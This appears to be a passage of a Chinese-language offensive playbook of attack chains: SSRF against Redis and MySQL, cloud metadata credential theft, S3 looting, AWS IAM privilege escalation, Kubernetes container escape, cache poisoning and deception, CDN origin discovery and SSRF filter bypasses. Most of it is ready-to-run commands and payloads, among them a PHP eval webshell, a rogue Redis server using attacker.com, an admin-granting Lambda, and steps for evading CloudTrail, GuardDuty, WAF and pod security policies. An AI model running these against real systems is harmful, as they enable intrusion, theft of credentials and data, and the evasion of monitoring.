dict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron
dict://127.0.0.1:6379/config%20set%20dbfilename%20root
dict://127.0.0.1:6379/save
```

**5. 5. 主从复制RCE**
_主从复制RCE_
```
# 使用redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
利用Redis主从复制加载恶意模块
```

**WAF/EDR 绕过变体：**

**1. Gopher协议构造**
_使用Gopher协议_
```
使用Gopher协议构造完整的Redis命令序列
可以绕过Dict协议限制
```

---

### SSRF攻击MySQL  `ssrf-mysql`
利用SSRF攻击内网MySQL服务
子类：**MySQL攻击** · tags: `ssrf` `mysql` `gopher` `database`

**前置条件：** 存在SSRF漏洞；内网存在MySQL服务；知道MySQL用户名

**攻击链：**

**1. 1. MySQL协议基础**
_MySQL协议基础_
```
MySQL通信协议:
- 握手包
- 认证包
- 命令包
需要构造符合协议的数据
```

**2. 2. 使用Gopher攻击MySQL**
_Gopher协议攻击MySQL_
```
# 构造MySQL协议数据包
# 需要使用工具生成
gopher://127.0.0.1:3306/_[MySQL Protocol Data]

# 使用sqlmap
gopher://127.0.0.1:3306/_[sqlmap生成的payload]
```

**3. 3. 使用工具生成Payload**
_使用工具生成Payload_
```
# 使用Gopherus工具
python gopherus.py --exploit mysql
输入用户名和SQL命令
生成Gopher URL

# 或使用mysql_gopher_attack工具
```

**4. 4. 执行SQL命令**
_执行SQL命令_
```
SELECT * FROM users;
SELECT user(), version();
写入WebShell:
SELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";
```

**WAF/EDR 绕过变体：**

**1. 无密码MySQL**
_利用空密码配置_
```
如果MySQL允许空密码连接
可以更容易构造攻击载荷
```

---

### · 云安全漏洞

### 云SSRF窃取元数据凭据  `cloud-ssrf-metadata`
利用SSRF漏洞访问云服务(AWS/GCP/Azure)的实例元数据服务(IMDS)获取临时IAM凭据。攻击者可通过获取的Access Key接管云资源，实现从Web漏洞到云环境的横向升级。
子类：**IMDS攻击** · tags: `云安全` `SSRF` `AWS` `GCP` `Azure` `IMDS` `元数据`

**前置条件：** 目标运行在云环境；存在SSRF漏洞；实例绑定了IAM角色

**攻击链：**

**1. 1. AWS元数据服务探测**
_通过SSRF访问AWS EC2实例元数据服务获取IAM临时凭据_
```
# IMDSv1——无需特殊Header
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/"

# 获取IAM角色名
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 获取临时凭据
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}"

# 获取用户数据(可能包含启动脚本中的密钥)
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/user-data"
```

**2. 2. GCP/Azure元数据利用**
_获取GCP和Azure云环境的元数据凭据和管理令牌_
```
# GCP元数据——需要Metadata-Flavor头
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# GCP获取项目信息
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# Azure管理令牌
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

**3. 3. 利用获取的凭据横向移动**
_使用窃取的云凭据通过AWS CLI枚举云资源和权限_
```
# 配置AWS CLI使用窃取的凭据
export AWS_ACCESS_KEY_ID="{STOLEN_ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="{STOLEN_SECRET_KEY}"
export AWS_SESSION_TOKEN="{STOLEN_SESSION_TOKEN}"

# 枚举权限
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name {ROLE_NAME}

# 列举S3桶
aws s3 ls

# 枚举EC2实例
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,IP:PrivateIpAddress,State:State.Name}"
```

**4. 4. 深度利用——S3数据泄露/权限提升**
_利用获取的云凭据导出S3数据、检查IAM提权可能性和提取密钥_
```
# S3桶数据下载
aws s3 sync s3://{BUCKET_NAME} ./loot/ --no-sign-request 2>/dev/null
aws s3 ls s3://{BUCKET_NAME} --recursive | head -50

# 检查是否可以提权
aws iam list-users
aws iam create-access-key --user-name admin 2>/dev/null
aws lambda list-functions
aws ssm describe-parameters

# 检查Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id {SECRET_NAME}
```

**WAF/EDR 绕过变体：**

**1. 绕过SSRF的IMDS防护**
_通过IP变形、DNS重绑定和协议走私绕过SSRF对IMDS地址的过滤_
```
# IMDSv2需要PUT获取Token——尝试Header注入
curl "https://{TARGET}/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT

# IP变形
http://[::ffff:169.254.169.254]
http://0xa9fea9fe
http://2852039166
http://169.254.169.254.nip.io

# DNS重绑定
http://169-254-169-254.attacker.com  # 解析到169.254.169.254

# 协议走私
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
```

---

### S3存储桶配置错误利用  `cloud-s3-misconfig`
利用AWS S3存储桶的访问控制配置错误(公开读/写/列举)获取敏感数据或植入恶意文件。常见于静态网站托管、日志存储和备份桶，可能导致数据泄露、网站篡改或供应链攻击。
子类：**S3安全** · tags: `云安全` `S3` `AWS` `配置错误` `数据泄露`

**前置条件：** 已知目标S3桶名；AWS CLI或HTTP访问

**攻击链：**

**1. 1. S3桶名枚举**
_通过域名变体、DNS记录和前端代码发现目标S3存储桶_
```
# 基于域名猜测桶名
for prefix in "" "www-" "dev-" "staging-" "backup-" "logs-" "assets-" "static-"; do
  for suffix in "" "-prod" "-dev" "-staging" "-backup" "-data" "-assets"; do
    bucket="${prefix}{COMPANY}${suffix}"
    aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null && echo "PUBLIC: $bucket"
  done
done

# DNS CNAME检查
dig +short CNAME {TARGET} | grep s3

# 从前端资源URL发现
curl -s "https://{TARGET}" | grep -oP "https?://[^"]+\.s3[^"]*amazonaws\.com[^"]+"
```

**2. 2. 权限枚举**
_测试S3桶的匿名列举、读取、写入权限和策略配置_
```
# 测试列举权限
aws s3 ls "s3://{BUCKET}" --no-sign-request

# 测试读取权限
aws s3 cp "s3://{BUCKET}/index.html" /tmp/test --no-sign-request 2>/dev/null && echo "READ OK"

# 测试写入权限
echo "security-test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://{BUCKET}/security-test.txt" --no-sign-request 2>/dev/null && echo "WRITE OK"

# 检查Bucket Policy
aws s3api get-bucket-policy --bucket {BUCKET} --no-sign-request 2>/dev/null | jq

# 检查ACL
aws s3api get-bucket-acl --bucket {BUCKET} --no-sign-request 2>/dev/null | jq
```

**3. 3. 敏感数据搜索**
_枚举桶中所有文件并定向搜索下载敏感文件_
```
# 递归列举所有文件
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | tee s3_listing.txt

# 搜索敏感文件
grep -iE "\.(sql|bak|env|key|pem|pfx|p12|csv|xls|doc|pdf|config|yml|json|log|dump)" s3_listing.txt

# 下载关键文件
for ext in .env .sql .bak .key .pem config.yml database.json; do
  aws s3 cp "s3://{BUCKET}/$ext" ./loot/ --recursive --exclude "*" --include "*$ext" --no-sign-request 2>/dev/null
done

# 搜索备份数据库
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | grep -iE "dump|backup|export" | head -20
```

**4. 4. 验证利用（静态网站篡改/XSS）**
_测试S3网站桶的写入权限并验证是否可托管自定义HTML(可导致XSS/篡改)_
```
# 如果桶托管了静态网站且可写
# 检查是否为网站桶
aws s3api get-bucket-website --bucket {BUCKET} --no-sign-request 2>/dev/null

# 上传XSS测试页面(无害)
echo '<html><body><h1>Security Test</h1></body></html>' > /tmp/security-test.html
aws s3 cp /tmp/security-test.html "s3://{BUCKET}/security-test.html" \
  --content-type "text/html" --no-sign-request

# 验证是否可访问
curl -s "https://{BUCKET}.s3.amazonaws.com/security-test.html" | head

# 清理测试文件
aws s3 rm "s3://{BUCKET}/security-test.html" --no-sign-request
```

**WAF/EDR 绕过变体：**

**1. 绕过S3访问限制**
_通过区域端点变换、路径格式和已认证用户组绕过S3访问限制_
```
# 使用不同区域端点
aws s3 ls "s3://{BUCKET}" --region us-west-2 --no-sign-request

# 使用路径格式(可能绕过某些WAF)
curl -s "https://s3.amazonaws.com/{BUCKET}/"
curl -s "https://s3.{REGION}.amazonaws.com/{BUCKET}/"

# 使用已认证但不同账号的AWS凭据
# (某些桶策略允许"AuthenticatedUsers"组)
aws s3 ls "s3://{BUCKET}" --profile any-aws-account

# Signed URL泄露搜索
# 在Google/GitHub搜索: "s3.amazonaws.com/{BUCKET}" "X-Amz-Signature"
```

---

### AWS IAM权限提升  `cloud-iam-escalation`
在已获取低权限AWS凭据后，利用IAM策略中的过度授权(如iam:PassRole、lambda:CreateFunction等)实现权限提升至管理员。涵盖20+种已知的AWS IAM提权路径。
子类：**IAM提权** · tags: `云安全` `AWS` `IAM` `权限提升` `Privilege Escalation`

**前置条件：** 已获取AWS凭据；IAM策略存在过度授权

**攻击链：**

**1. 1. 枚举当前权限**
_枚举当前IAM身份的所有权限和策略_
```
# 基础身份信息
aws sts get-caller-identity

# 枚举当前用户的策略
aws iam list-user-policies --user-name {USERNAME}
aws iam list-attached-user-policies --user-name {USERNAME}

# 获取策略详情
aws iam get-policy-version --policy-arn {POLICY_ARN} --version-id v1 | jq '.PolicyVersion.Document'

# 使用enumerate-iam工具自动化
python3 enumerate-iam.py --access-key {AK} --secret-key {SK}
```

**2. 2. iam:PassRole + Lambda提权**
_利用iam:PassRole和lambda:CreateFunction创建使用高权限角色的Lambda函数实现提权_
```
# 创建恶意Lambda函数(需要iam:PassRole + lambda:CreateFunction)

# 创建Lambda代码
cat > /tmp/lambda.py << 'PYEOF'
import boto3
def handler(event, context):
    client = boto3.client("iam")
    # 为当前用户附加管理员策略
    client.attach_user_policy(
        UserName="low-priv-user",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {"status": "escalated"}
PYEOF

cd /tmp && zip lambda.zip lambda.py

# 创建Lambda并关联高权限角色
aws lambda create-function \
  --function-name security-test \
  --runtime python3.9 \
  --handler lambda.handler \
  --zip-file fileb:///tmp/lambda.zip \
  --role arn:aws:iam::{ACCOUNT}:role/{HIGH_PRIV_ROLE}

# 触发执行
aws lambda invoke --function-name security-test /tmp/output.json
```

**3. 3. 其他提权路径**
_展示多条IAM提权路径：策略版本覆盖、密钥创建和角色信任策略修改_
```
# 路径1: iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn {POLICY_ARN} \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 路径2: iam:CreateAccessKey (为其他用户创建密钥)
aws iam create-access-key --user-name admin

# 路径3: iam:UpdateAssumeRolePolicy + sts:AssumeRole
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::{ACCOUNT}:user/low-priv"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::{ACCOUNT}:role/AdminRole --role-session-name escalation
```

**4. 4. 自动化提权工具**
_使用PACU、pmapper和cloudfox自动化发现和利用IAM提权路径_
```
# PACU——AWS渗透测试框架
python3 pacu.py
# 在PACU中:
> import_keys {AK} {SK}
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# pmapper——IAM策略可视化和提权路径分析
pmapper graph --create
pmapper analysis --output-type text
pmapper visualize --filetype png

# cloudfox枚举
cloudfox aws --profile target all-checks
```

**WAF/EDR 绕过变体：**

**1. 绕过CloudTrail和GuardDuty检测**
_通过使用非标准区域、低速操作和会话令牌降低被检测的风险_
```
# 使用非标准区域(可能未开启CloudTrail)
aws iam list-users --region af-south-1

# 低速操作避免触发异常检测
sleep $((RANDOM % 60 + 30))  # 30-90秒随机延迟

# 使用AWS服务间调用减少直接API日志
# 通过Lambda/SSM间接执行而非直接CLI调用

# 使用Session Token而非长期凭据
aws sts get-session-token --duration-seconds 3600
```

---

### Kubernetes容器逃逸  `cloud-k8s-escape`
在已获取Kubernetes Pod Shell的前提下，利用配置错误(特权容器、挂载宿主机路径、ServiceAccount高权限)实现容器逃逸，进而控制宿主机或整个Kubernetes集群。
子类：**容器安全** · tags: `云安全` `Kubernetes` `容器逃逸` `Docker` `特权容器`

**前置条件：** 已获取Pod内Shell；Pod存在配置错误

**攻击链：**

**1. 1. 容器环境侦察**
_确认容器环境并检查特权模式、SA令牌和内核能力_
```
# 确认在容器中
cat /proc/1/cgroup 2>/dev/null | grep -E "docker|kubepods"
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
env | grep KUBERNETES

# 检查ServiceAccount令牌
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 检查特权模式
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
fdisk -l 2>/dev/null | head
capsh --print 2>/dev/null | grep "Current"
```

**2. 2. 特权容器逃逸**
_利用特权容器的磁盘挂载和cgroup release_agent实现宿主机命令执行_
```
# 方法1：挂载宿主机根文件系统
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法2：通过cgroup逃逸(CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/sh" > /cmd
echo "id > /output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```

**3. 3. 利用ServiceAccount接管集群**
_利用Pod中的ServiceAccount令牌通过K8s API枚举权限和获取集群Secrets_
```
# 读取SA Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# 枚举权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'

# 列出所有Pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/pods"

# 列出Secrets
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/secrets"
```

**4. 4. 创建特权Pod反弹Shell**
_创建挂载宿主机根目录的特权Pod实现容器逃逸_
```
# 如果SA有create pods权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/api/v1/namespaces/default/pods" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "security-test-pod"},
    "spec": {
      "containers": [{
        "name": "test",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "apk add curl; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'
```

**WAF/EDR 绕过变体：**

**1. 绕过PodSecurityPolicy/OPA**
_通过切换命名空间、使用临时容器和CronJob绕过Pod安全策略_
```
# 使用非default命名空间(可能未应用PSP)
curl -s "$K8S/api/v1/namespaces" -H "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'

# 使用ephemeral容器(可能绕过PSP)
curl -s "$K8S/api/v1/namespaces/default/pods/{POD}/ephemeralcontainers" \
  -X PATCH -H "Content-Type: application/strategic-merge-patch+json" \
  -d '{"spec":{"ephemeralContainers":[{"name":"debug","image":"alpine","command":["sh"]}]}}'

# 使用CronJob而非Pod(某些策略不覆盖)
curl -s "$K8S/apis/batch/v1/namespaces/default/cronjobs" ...
```

---

### · 缓存与CDN安全

### 缓存投毒  `cache-poisoning`
Web缓存投毒攻击
子类：**缓存投毒** · tags: `cache` `poisoning` `web-cache`

**前置条件：** 目标使用缓存；缓存键配置不当

**攻击链：**

**1. 探测缓存**
_探测缓存状态_
```
响应头: X-Cache: hit/miss
```

**2. 未键入头**
_注入未键入头_
```
X-Forwarded-Host: attacker.com
```

**3. 缓存投毒**
_投毒缓存_
```
GET /?q=test HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

**4. Fat GET**
_Fat GET投毒_
```
GET / HTTP/1.1
Host: target.com
Content-Length: 10

q=poisoned
```

**WAF/EDR 绕过变体：**

**1. 未键入头部(Unkeyed Headers)利用**
_识别不包含在缓存键中但影响响应内容的HTTP头(如X-Forwarded-Host)，通过重复发送携带恶意头的请求将投毒响应存入缓存_
```
# 常见未键入头:
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /malicious
X-Forwarded-Prefix: /evil

# 发现未键入头:
# 使用Param Miner Burp扩展自动检测
# 手动对比: 添加头后响应是否变化但缓存键相同

# 投毒步骤:
# 1. 发送带恶意头的请求直到缓存命中
# 2. 验证其他用户访问同一URL时收到投毒响应
```

**2. 参数伪装与HTTP/2专属头投毒**
_利用UTM等追踪参数不被缓存键包含的特性注入恶意内容，或使用Fat GET请求体覆盖查询参数，HTTP/2独有伪头触发差异化处理_
```
# 参数伪装(Parameter Cloaking):
# UTM参数通常不在缓存键中:
/page?utm_content=<script>alert(1)</script>
/page?callback=alert(1)&utm_source=x

# Fat GET投毒:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=<script>alert(1)</script>

# HTTP/2专属头:
:method: GET
:path: /
transfer-encoding: chunked
```

---

### 缓存欺骗  `cache-deception`
利用Web缓存和服务器路径解析的差异，诱导CDN/缓存层缓存包含敏感信息的动态页面
子类：**Deception** · tags: `cache` `deception` `auth`

**前置条件：** 目标使用CDN或反向代理缓存；路径解析存在差异(后端忽略路径后缀)；缓存策略基于URL扩展名

**攻击链：**

**1. 探测缓存行为**  _[linux]_
_检测目标的缓存层和缓存策略配置_
```
# 检测是否存在缓存层:
curl -sI "http://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"

# 测试缓存策略(静态文件是否被缓存):
curl -sI "http://target.com/test.css" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.js" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.jpg" | grep -iE "x-cache|age"

# 对比动态页面:
curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"
```

**2. 路径混淆缓存欺骗**
_在动态页面URL后附加静态文件扩展名触发缓存_
```
# 核心技巧: 在动态页面URL后添加静态文件扩展名
# 后端将 /account/profile.css 解析为 /account (忽略不存在的路径)
# 缓存层看到 .css 扩展名，认为是静态资源并缓存

# 步骤1: 构造欺骗URL(以受害者身份访问)
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile.css"

# 步骤2: 攻击者无需认证直接访问缓存内容
curl "http://target.com/account/profile.css"

# 多种路径变体:
curl "http://target.com/account/x.js"
curl "http://target.com/account/x.jpg"
curl "http://target.com/account/x.png"
curl "http://target.com/api/user/info/x.css"
curl "http://target.com/settings/x.svg"
```

**3. 高级缓存欺骗变体**
_利用路径分隔符、参数和规范化差异的高级缓存欺骗_
```
# 分隔符混淆(不同组件对路径分隔符理解不同):
curl "http://target.com/account;x.css"
curl "http://target.com/account%23x.css"
curl "http://target.com/account%3fx.css"

# 参数污染:
curl "http://target.com/account?cb=123.css"
curl "http://target.com/account/..%2fstatic/x.css"

# RPO (Relative Path Overwrite):
curl "http://target.com/account/..%2f..%2fstatic/style.css"

# Normalization差异:
curl "http://target.com/account/./x.css"
curl "http://target.com/account%2fx.css"
```

**4. 完整攻击流程验证**
_演示从诱导缓存到窃取数据的完整攻击链_
```
# 完整攻击演示:

# 1. 先确认动态页面包含敏感信息:
curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email|phone|address|token"

# 2. 诱导受害者访问欺骗URL(通过钓鱼邮件/消息):
# 受害者点击: http://target.com/account/avatar.jpg
# 这会将其/account页面(含个人信息)缓存为"图片"

# 3. 攻击者访问同一URL获取缓存的敏感信息:
curl "http://target.com/account/avatar.jpg"
# 返回受害者的账户页面(包含邮箱、手机号、地址等)

# 4. 验证缓存命中:
curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
# 期望看到: X-Cache: HIT
```

**WAF/EDR 绕过变体：**

**1. 路径分隔符混淆**
_利用缓存服务器与源站对分号、换行、井号等分隔符解析不一致触发缓存_
```
# 利用缓存服务器对路径分隔符的差异解析
https://target.com/account/settings;.css
https://target.com/account/settings%0a.css
https://target.com/account/settings%23.css
https://target.com/account/settings%3f.css

# URL编码分隔符
https://target.com/account/settings%2f.css
https://target.com/account/settings%5c.css
```

**2. RPO相对路径覆盖**
_利用相对路径覆盖（RPO）使浏览器请求敏感页面但缓存服务器按静态资源缓存_
```
# Relative Path Overwrite
https://target.com/account/settings/..%2f..%2fstatic/style.css
https://target.com/account/settings/nonexistent.css

# 路径参数注入
https://target.com/account/settings;param=value/test.css
https://target.com/account/settings/test.js?_=1

# 不同缓存键操控
https://target.com/account/settings HTTP/1.1
X-Original-URL: /static/style.css
```

**3. 缓存与源站规范化差异**
_利用CDN/反向代理与源站对URL规范化处理的差异，使缓存误缓存敏感内容_
```
# Cloudflare/Varnish路径规范化差异
https://target.com/account/settings/.css
https://target.com/account/settings/test.avif
https://target.com/account/settings/x.woff2

# 双斜杠混淆
https://target.com//account//settings.css
https://target.com/account/settings%252f.css

# 利用Vary头缺失
curl -H "Accept: text/css" https://target.com/account/settings
```

---

### CDN绕过  `cdn-bypass`
绕过CDN查找真实IP
子类：**CDN** · tags: `cdn` `bypass` `recon`

**前置条件：** 目标使用CDN

**攻击链：**

**1. 历史DNS**
_查找未使用CDN时的IP_
```
# DNS历史记录查询获取真实IP:
# 1. SecurityTrails(需要API Key):
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'

# 2. ViewDNS:
curl -s "https://viewdns.info/iphistory/?domain=target.com"

# 3. DNS DB在线查询:
# https://dnsdb.io/
# https://securitytrails.com/
# https://completedns.com/

# 4. Censys搜索:
curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com"   -u "API_ID:API_SECRET"

# 5. 使用FOFA:
# domain="target.com" && type="A"

# 6. 多地Ping对比:
nslookup target.com 8.8.8.8
nslookup target.com 1.1.1.1
```

**2. 邮件头**
_查看邮件源码中的Received头_
```
# 通过邮件头泄露真实IP:
# 1. 触发目标站点发送邮件(注册/找回密码/订阅):
curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
curl -d "email=attacker@gmail.com" "http://target.com/subscribe"

# 2. 查看收到邮件的原始头(Gmail: 显示原始邮件):
# 查找以下字段中的IP:
# Received: from mail.target.com (203.0.113.50)
# X-Originating-IP: [203.0.113.50]
# Return-Path: <noreply@target.com>

# 3. 使用swaks发送邮件触发:
swaks --to attacker@gmail.com --from test@target.com --server target.com

# 4. 分析邮件头:
# 最底部的Received字段通常包含源服务器真实IP

# 5. 如果目标有RSS订阅:
# 订阅后查看请求来源IP
curl "http://target.com/rss" -v
```

**3. DNS历史与证书透明度查询**
_通过DNS历史、证书透明度、搜索引擎查找CDN背后的真实IP_
```
# 1. DNS历史记录查询:
# SecurityTrails:
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | python3 -m json.tool

# 在线查询:
# https://viewdns.info/iphistory/?domain=target.com
# https://completedns.com/dns-history/
# https://dnshistory.org/dns-records/target.com

# 2. 证书透明度日志(CT Log):
curl -s "https://crt.sh/?q=target.com&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"

# 3. Censys搜索:
# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com

# 4. FOFA/Shodan搜索:
# FOFA: cert="target.com"
# Shodan: ssl.cert.subject.cn:target.com
```

**4. 子域名与相关服务探测真实IP**  _[linux]_
_通过子域名、邮件记录、主动连接等方式发现真实IP_
```
# 1. 子域名可能未经CDN:
for sub in mail ftp ssh vpn dev staging test api admin mx; do
  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
done

# 2. MX记录(邮件服务器通常不走CDN):
dig +short target.com MX
dig +short $(dig +short target.com MX | awk '{print $2}') A

# 3. SPF记录中的IP:
dig +short target.com TXT | grep -i "spf"
# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50可能是真实IP

# 4. 触发目标服务器主动连接:
# 在目标网站留下一个URL(如头像、webhook)指向自己的服务器
# 查看连接IP(这是目标的出站IP，通常是真实IP):
# nc -lvp 8888

# 5. SSRF利用:
# 如果存在SSRF漏洞，让服务器连接外部获取IP
curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"
```

**5. 验证真实IP并直接访问**  _[linux]_
_验证候选IP并直接访问绕过CDN防护_
```
# 1. 验证候选IP是否是真实服务器:
REAL_IP="203.0.113.50"

# 直接IP访问(Host头指定域名):
curl -sI "http://${REAL_IP}/" -H "Host: target.com"

# HTTPS访问(忽略证书):
curl -sk "https://${REAL_IP}/" -H "Host: target.com"

# 2. 对比响应确认:
cdn_resp=$(curl -s "https://target.com/" | md5sum)
direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
echo "CDN: $cdn_resp"
echo "Direct: $direct_resp"
[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"

# 3. 修改hosts绕过CDN测试:
echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts

# 4. 直接对真实IP进行渗透(绕过CDN的WAF):
nmap -sV -p 1-65535 ${REAL_IP}
# CDN的WAF通常只保护CDN入口，直接访问真实IP可绕过
```

**WAF/EDR 绕过变体：**

**1. 绕过CDN WAF的多种技术**
_利用真实IP和非标端口绕过CDN的WAF防护_
```
# 找到真实IP后，CDN的WAF就被完全绕过了
# 但如果目标自身也有WAF，还需要:

# 1. 使用真实IP直接访问(绕过CDN WAF):
curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"

# 2. 如果CDN仅对常见端口做WAF:
# 扫描非标端口的Web服务:
nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP

# 3. IPv6绕过(CDN可能只保护IPv4):
dig +short target.com AAAA
curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"

# 4. 源站IP白名单探测:
# 某些源站配置了仅允许CDN IP访问
# 尝试伪造CDN的IP:
curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
```

### SSRF 通用绕过三件套 — UA 头 / DNS 重绑定 / 302 重定向

服务端做了 URL 白名单 / IP 校验 / 私网段过滤,但**校验时拉到的内容与实际请求时拉到的不是同一份**。以下三种绕过技术分别打"User-Agent 分支"、"DNS 解析时间窗"、"重定向跟随"。

#### 1. UA 头分支绕过(常见于头像 / 图片下载接口)

后端按 `User-Agent` 分流,内部代理 / 业务客户端走"无校验"分支,普通浏览器 UA 走"严格校验"分支。

```php
<?php
$_user_agent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($_user_agent, 'go-httpclient') !== false) {
    // 业务内部走客户端,直接跳到内部域不校验
    header("Location: http://internal.test.qq.com/flag.html");
} else {
    // 普通用户走安全外链
    header("Location: https://example.com/public.png");
}
?>
```

```text
# 绕过:把 UA 改成业务客户端
curl -A "go-httpclient/1.0" "https://target.com/fetch?url=https://attacker.example/img"
curl -A "Java/1.8.0_271" ...
curl -A "okhttp/4.9.0" ...
curl -A "python-requests/2.28" ...
curl -A "PostmanRuntime/7.30" ...

# 看响应是否包含内部域内容(304 / Location: 内网 / 内容长度异常)即可判断分支命中
```

**典型触发点**:头像上传(URL 模式)、富文本"插入网络图片"、Webhook 配置、邮件附件预览、URL 链接预览。

#### 2. DNS 重绑定(TOCTOU)

服务端先解析 DNS 做白名单校验,然后再次解析发起请求。**两次解析之间 DNS 记录被切换** → 校验时是公网 IP、请求时是内网 IP。

```text
# 在线 rebinder(测试环境;实战自架避免与他人冲突)
https://lock.cmpxchg8b.com/rebinder.html?1   # 1.1.1.1 ↔ 127.0.0.1 交替
https://lock.cmpxchg8b.com/rebinder.html?2   # 自定义 IP

# 关键参数
- 设置极短 TTL(0 或 1)避免后端缓存解析
- 使用 round-robin 把 [公网 IP, 127.0.0.1] 两条 A 记录交替返回
- 127.0.0.1 的变种(校验逻辑只 blacklist 字面 127.0.0.1 时):
    127.1
    127.0.1
    0.0.0.0
    0
    0x7f000001
    2130706433        # decimal
    017700000001      # octal
    [::1]
    [::ffff:7f00:1]
    localtest.me      # 解析到 127.0.0.1 的公网域名
    spoofed.burpcollaborator.net

